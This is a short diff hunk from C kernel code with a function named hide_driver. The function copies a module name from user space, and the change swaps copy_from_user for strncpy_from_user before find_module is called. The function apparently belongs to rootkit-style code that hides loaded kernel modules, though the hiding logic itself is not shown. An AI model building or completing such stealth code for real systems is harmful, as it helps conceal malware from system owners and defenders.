@@ -13,7 +13,7 @@
 
 static int hide_driver(const char* name) {
     char kernel_name[100];
-    copy_from_user(kernel_name,name,100);
+    strncpy_from_user(kernel_name,name,100);
     struct module *target = NULL;
     
     target = find_module(kernel_name);
